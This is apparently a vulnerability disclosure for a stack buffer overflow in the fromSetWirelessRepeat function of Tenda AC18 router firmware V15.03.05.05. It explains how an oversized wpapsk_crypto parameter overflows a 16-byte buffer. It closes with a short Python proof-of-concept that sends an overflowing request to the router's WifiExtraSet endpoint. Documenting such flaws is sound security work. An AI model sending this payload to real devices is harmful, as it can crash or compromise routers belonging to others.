## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `fromSetWirelessRepeat` function. The `src` variable receives the `wpapsk_crypto` parameter from a POST request and is later assigned to the `v14` variable, which is fixed at 16 bytes. However, since the user can control the input of `wpapsk_crypto`, the statement `strcpy(v14, src);` can cause a buffer overflow. The user-provided `wpapsk_crypto` can exceed the capacity of the `v14` array, triggering this security vulnerability.

![image-20240308151036263](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151036263.png)

![image-20240308151127759](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151127759.png)

The `nptr` variable receives the `wifi_chkHz` parameter from a POST request and we make it equal to 0.

![image-20240308151407876](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151407876.png)

The `v50` variable receives the `security` parameter from a POST request and we make it equal to "wpapsk". 

![image-20240308151511009](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151511009.png)

![image-20240308151455386](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151455386.png)

![image-20240308151538527](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151538527.png)

## PoC

```python
import requests

IP = '192.168.84.101'
url = f"http://{IP}/goform/WifiExtraSet?"
url += "wifi_chkHz=0&wl_mode=0&security=wpapsk&wpapsk_key=aaaaaaa&wpapsk_crypto=" + "s" * 0x600

response = requests.get(url)
```

![image-20240308151600333](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308151600333.png)

